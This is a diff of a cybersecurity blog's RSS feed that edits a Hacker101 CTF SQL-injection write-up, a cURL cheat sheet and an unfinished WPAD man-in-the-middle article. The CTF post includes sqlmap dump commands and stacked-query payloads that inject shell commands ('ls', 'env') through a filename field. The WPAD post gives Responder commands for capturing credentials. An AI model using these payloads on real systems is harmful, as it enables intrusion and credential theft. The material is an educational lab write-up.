@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Mon, 04 Jan 2021 17:18:52 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Tue, 19 Jan 2021 11:25:47 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
 <p>This is my Write Up for the "Photo Gallery" challenge of HackerOne's CTF.</p>
 <p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
 The missing one is called <code>Invisible</code>, so lets look into that.</p>
@@ -58,7 +58,7 @@ soo.. were kinda stuck lets just get another hint then:</p>
 <p>The state uf the union? are they hinting on using UNION statements in the query?
 <em>The UNION operator is used to combine the result-set of two or more SELECT statements.</em>
 That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:</p>
-<p>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'</p>
+<p><code>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'</code></p>
 <p>but what do we look for? Lets get another hint.</p>
 <blockquote>
   <p>Hint 3: <em>This application runs on the <strong>uwsgi-nginx-flask-docker</strong> image</em></p>
@@ -94,7 +94,7 @@ callable = app
 <p>This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column <code>filename</code> since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.</p>
 <pre><code class="python language-python">sqlmap -u "http://35.190.155.168/c947e97f6e/fetch?id=3" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename
 </code></pre>
-<p>This means that swlmap will start with the filename of id=3 which is exactly what we want right now.</p>
+<p>This means that sqlmap will start with the filename of id=3 which is exactly what we want right now.</p>
 <p><img src="/hackerone/photo-gallery-hash.png" alt="starts to query filename of id 3" title="query on the filename of id 3" />
 So lets have a look at our results:</p>
 <pre><code class="python language-python">Database: level5
@@ -114,38 +114,98 @@ Table: photos
   you should be able to re-run sqlmap to find the missing characters
   <code>9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</code></p>
 </blockquote>
-<p>decrypted: <code>\*||+ls+-a+tmp.txt</code></p>
-<p>so we try this request:
-<code>GET /ad3e8c7df9/fetch?id=3\*||+ls+-a+tmp.txt</code></p>
-<p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p>
-<p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- HTTP/1.1</code></p>
+<p>decrypted: <code>\*||+ls+-a+tmp.txt</code>
+another file! nice lets try and get that with a UNION STATEMENT request like so:</p>
+<p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1</code>
+hmm no luck it seems… let's do it another way.</p>
+<p>From our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.</p>
+<p>We want to run following statements via the vulnerable param:</p>
+<h4 id="lsinthefilesdirectoryandstoredatainbigwintxt">ls in the /files directory and store data in bigWin.txt</h4>
+<p><code>update photos set filename='* || ls ./files &gt;bigWin.txt ' where id=3; commit;</code></p>
+<p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p>
+<h4 id="storeallenvdatainbigwintxtbecausesooftenflagsarehere">store all env data in bigWin.txt (because so often flags are here)</h4>
+<p><code>update photos set filename='* || env &gt;bigWin.txt' where id=3; commit;</code></p>
+<p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1</code></p>
+<p>after you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!</p>
+<p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1</code></p>
+<p>Tadaa!! we got it all.</p>
 <pre><code class="bash language-bash">"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$"
 "^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$"
 HOSTNAME=ad3e8c7df92d
 SHLVL=0
-</code></pre>]]></description><link>https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackerone]]></category><category><![CDATA[hacker101]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sun, 03 Jan 2021 12:20:32 GMT</pubDate></item><item><title><![CDATA[the only cURL cheat sheet]]></title><description><![CDATA[<h1 id="curlwhatisit">cURL What is it?</h1>
+</code></pre>]]></description><link>https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackerone]]></category><category><![CDATA[hacker101]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sun, 03 Jan 2021 12:20:31 GMT</pubDate></item><item><title><![CDATA[the cURL cheat sheet]]></title><description><![CDATA[<h1 id="curlwhatisit">cURL What is it?</h1>
 <p>cURL describes itself as:</p>
 <blockquote>
   <p>command line tool and library for transferring data with URLs</p>
 </blockquote>
 <p>cURL is a multipurpose networking tool which has lots of useful usecases.</p>
 <h1 id="cheatsheet">cheat sheet</h1>
-<p>| <strong>Command</strong>                                                                                                  | <strong>Description</strong>                             |
-| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
-| <code>curl http://inlanefreight.com</code>                                                                              | GET request with <code>cURL</code>                     |
-| <code>curl http://inlanefreight.com -v</code>                                                                           | Verbose GET request with <code>cURL</code>             |
-| <code>curl http://admin:password@inlanefreight.com/ -vvv</code>                                                         | <code>cURL</code> Basic Auth login                     |
-| <code>curl -u admin:password http://inlanefreight.com/ -vvv</code>                                                      | Alternate <code>cURL</code> Basic Auth login           |
-| <code>curl -u admin:password -L http://inlanefreight.com/</code>                                                        | <code>cURL</code> Basic Auth login, follow redirection |
-| <code>curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'</code>                                  | <code>cURL</code> GET request with parameter           |
-| <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php</code>                           | POST request with <code>cURL</code>                    |
-| <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php -v</code>                        | Debugging with <code>cURL</code>                       |
-| <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v</code> | Cookie usage with <code>cURL</code>                    |
-| <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php</code>  | <code>cURL</code> with cookie file                     |
-| <code>curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'</code>            | <code>cURL</code> specify content type                 |
-| <code>curl -X OPTIONS http://inlanefreight.com/ -vv</code>                                                              | <code>cURL</code> OPTIONS request                      |
-| <code>curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv</code>                                             | File upload with <code>cURL</code>                     |
-| <code>curl -X DELETE http://inlanefreight.com/test.txt -vv</code>                                                       | DELETE method with <code>cURL</code>                   |</p>]]></description><link>https://dev.lwlx.xyz/blog/blog/CTFWRITEUP</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/CTFWRITEUP</guid><category><![CDATA[cheatsheet]]></category><category><![CDATA[commandline]]></category><category><![CDATA[curl]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sat, 02 Jan 2021 19:40:32 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl http://lwlx.xyz</code></td>
+<td>GET request with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl http://lwlx.xyz -v</code></td>
+<td>Verbose GET request with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl http://admin:password@lwlx.xyz/ -vvv</code></td>
+<td><code>cURL</code> Basic Auth login</td>
+</tr>
+<tr>
+<td><code>curl -u admin:password http://lwlx.xyz/ -vvv</code></td>
+<td>Alternate <code>cURL</code> Basic Auth login</td>
+</tr>
+<tr>
+<td><code>curl -u admin:password -L http://lwlx.xyz/</code></td>
+<td><code>cURL</code> Basic Auth login, follow redirection</td>
+</tr>
+<tr>
+<td><code>curl -u admin:password 'http://lwlx.xyz/search.php?port_code=us'</code></td>
+<td><code>cURL</code> GET request with parameter</td>
+</tr>
+<tr>
+<td><code>curl -d 'username=user&amp;password=pass' -L http://lwlx.xyz/login.php</code></td>
+<td>POST request with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl -d 'username=user&amp;password=pass' -L http://lwlx.xyz/login.php -v</code></td>
+<td>Debugging with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl -d 'username=user&amp;password=pass' -L --cookie-jar /dev/null http://lwlx.xyz/login.php -v</code></td>
+<td>Cookie usage with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl -d 'username=user&amp;password=pass' -L --cookie-jar cookies.txt http://lwlx.xyz/login.php</code></td>
+<td><code>cURL</code> with cookie file</td>
+</tr>
+<tr>
+<td><code>curl -H 'Content-Type: application/json' -d '{ "username" : "user", "password" : "pass" }'</code></td>
+<td><code>cURL</code> specify content type</td>
+</tr>
+<tr>
+<td><code>curl -X OPTIONS http://lwlx.xyz/ -vv</code></td>
+<td><code>cURL</code> OPTIONS request</td>
+</tr>
+<tr>
+<td><code>curl -X PUT -d @test.txt http://lwlx.xyz/test.txt -vv</code></td>
+<td>File upload with <code>cURL</code></td>
+</tr>
+<tr>
+<td><code>curl -X DELETE http://lwlx.xyz/test.txt -vv</code></td>
+<td>DELETE method with <code>cURL</code></td>
+</tr>
+</tbody>
+</table>]]></description><link>https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/basic-cURL-cheatsheet-lwlx</guid><category><![CDATA[cheatsheet]]></category><category><![CDATA[commandline]]></category><category><![CDATA[curl]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Thu, 31 Dec 2020 12:07:12 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
 <h1 id="whatiswpad">What is WPAD?</h1>
 <p>Sometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.</p>
 <p>PAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.</p>
@@ -187,35 +247,31 @@ SHLVL=0
 ## install Responder
 
 ## configure config
-
-## start analyzing first
-
-using the `-A` option enables analyze only mode
-**macOS:**
+-->
+<h2 id="startanalyzingfirst">start analyzing first</h2>
+<p>using the <code>-A</code> option enables analyze only mode
+<strong>macOS:</strong></p>
 <pre><code class="shell language-shell">./Responder.py -i &lt;your ip address&gt; -A
 </code></pre>
-
-**Linux:**
+<p><strong>Linux:</strong></p>
 <pre><code class="shell language-shell">./Responder.py -I &lt;your net interface&gt; -A
 </code></pre>
-
-## create payload adn custom FindProxyForURL()
-
-## run the attack:
-
-- `-w`: starts WPAD service
-- `-f`: fingerprints victims
-- `-v`: verbose output
-- `-F`: force auth to WPAD service
+<h2 id="createpayloadadncustomfindproxyforurl">create payload adn custom FindProxyForURL()</h2>
+<h2 id="runtheattack">run the attack:</h2>
+<ul>
+<li><code>-w</code>: starts WPAD service</li>
+<li><code>-f</code>: fingerprints victims</li>
+<li><code>-v</code>: verbose output</li>
+<li><code>-F</code>: force auth to WPAD service</li>
+</ul>
 <pre><code class="shell language-shell"> ./Responder.py -i 192.168.1.215 -w -f -v -F
 </code></pre>
-
-force basic auth to try and gain user & pass
-
-- `-b`: force Basic HTTP authentication
+<p>force basic auth to try and gain user &amp; pass</p>
+<ul>
+<li><code>-b</code>: force Basic HTTP authentication</li>
+</ul>
 <pre><code class="shell language-shell"> ./Responder.py -i 192.168.1.215 -w -f -v -b -F
 </code></pre>
--->
 <p><img src="/wpad-responder-exploit/responder-intercepted.png" alt="Succsessfull WPAD attack" title="Succsessfull WPAD attack, planting a reverse shell on the victim." /></p>
 <h1 id="mitigation">Mitigation</h1>
 <ul>
